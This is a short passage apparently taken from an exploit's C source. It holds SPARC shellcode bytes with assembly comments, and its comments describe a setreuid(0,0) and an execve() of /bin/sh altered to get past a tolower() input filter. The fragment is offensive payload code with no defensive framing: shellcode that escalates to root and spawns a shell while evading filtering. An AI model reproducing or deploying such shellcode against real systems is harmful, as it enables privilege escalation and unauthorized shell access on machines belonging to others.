...
/* setreuid(0,0); execve() of /bin/sh with slight tolower()-evasion mods */
...
/* execve() of /bin/sh, with extra 'or' for tolower() evasion */
"\x2d\x0b\xd8\x9a"   /* sethi %hi(0x2f626800), %l6 */
"\xac\x15\xa1\x4e"   /* or %l6, 0x14e, %l6         */
"\xac\x15\xa0\x20"   /* or %l6, 0x20, %l6          */
